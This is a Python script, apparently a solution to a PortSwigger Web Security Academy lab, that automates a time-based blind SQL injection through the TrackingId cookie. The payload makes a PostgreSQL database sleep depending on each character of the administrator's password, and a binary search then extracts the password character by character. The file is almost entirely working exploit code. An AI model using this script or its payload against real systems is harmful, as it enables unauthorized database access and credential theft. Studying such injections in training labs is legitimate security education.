import requests
import time
import warnings
import datetime
from tqdm import tqdm

#忽略waring
warnings.filterwarnings('ignore')

#小于
def lower(j,i):
    Cookie['TrackingId'] = "oc2BcTo1g8tveJdE'||(SELECT  (CASE WHEN (substring(password,%d,1)<'%c') THEN pg_sleep(3) ELSE pg_sleep(0) END) from users where username='administrator')--"%(j,i)
    print(Cookie)
    curr_time1=time.time()
    r = requests.get(url=url, proxies=proxy, headers=header, verify=False, cookies=Cookie)
    curr_time2=time.time()
    delta_time=curr_time2-curr_time1
    print(delta_time)
    if delta_time>3:
        #print("success")
        return 1
    else:
        return 0

#大于
def upper(j,i):
    Cookie['TrackingId'] = "oc2BcTo1g8tveJdE'||(SELECT  (CASE WHEN (substring(password,%d,1)>'%c') THEN pg_sleep(3) ELSE pg_sleep(0) END) from users where username='administrator')--"%(j,i)
    print(Cookie)
    curr_time1 = time.time()
    r = requests.get(url=url, proxies=proxy, headers=header, verify=False, cookies=Cookie)
    curr_time2=time.time()
    delta_time=curr_time2-curr_time1
    if delta_time>3:
        #print("success")
        return 1
    else:
        return 0
#二分查找
def binarySearch(lst,order, left, right):
    if left <= right:
        mid = (left + right)//2
        if lower(order,lst[mid]):
            right = mid - 1
        elif upper(order,lst[mid]):
            left = mid + 1
        else:
            print("get it:%c"%(lst[mid]))
            return lst[mid]
        return binarySearch(lst,order, left, right)
    else:
        print("can't find it.")
        return -1

if __name__ == '__main__':

    url = 'https://ac1c1f491ffd20cdc043a112007600d7.web-security-academy.net/filter?category=Gifts'
    # 打开代理，burp抓包
    proxy = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }

    header = {
        'User - Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'

    }

    Cookie = {
        'TrackingId': "",
        'session': 'foR1vuTFpHbDnuFxFo0Rveu0IxnNxOMQ'
    }

    #初始化字符串
    password=''
    #构造list
    lst = []
    for i in range(0x30, 0x61):
        char = chr(i)
        if char.isalpha() or char.isnumeric():
            lst.append(char.lower())

    print(lst)
    for j in tqdm(range(1,21)):
        password+=binarySearch(lst,j,0,len(lst)-1)
    print(password)